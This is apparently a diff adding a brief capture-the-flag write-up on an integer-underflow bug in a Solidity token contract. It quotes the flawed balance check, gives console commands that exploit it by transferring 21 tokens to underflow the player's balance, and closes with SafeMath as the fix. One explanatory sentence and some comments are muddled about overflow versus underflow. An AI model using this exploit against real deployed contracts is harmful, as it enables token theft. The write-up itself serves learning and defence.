@@ -1,0 +1,24 @@
+We can find the approximate location of the vulnerability in the code, like 
+    require(balances[msg.sender] - _value >= 0);
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+
+We can probably guess that is an integer overflow, and that is integer underflow.
+
+await contract.address  //get the Token address
+player                  //get our address
+contract.transfer('Token address', 21)      //this because we wanna make our balance integer underflow, so this address is Token.
+await contract.balanceOf(player)            //balance integer overflow
+
+
+Overflows are very common in solidity and must be checked for with control statements such as:
+
+if(a + c > a) {
+  a = a + c;
+}
+An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:
+
+a = a.add(c);
+If there is an overflow, the code will revert.
+
+    
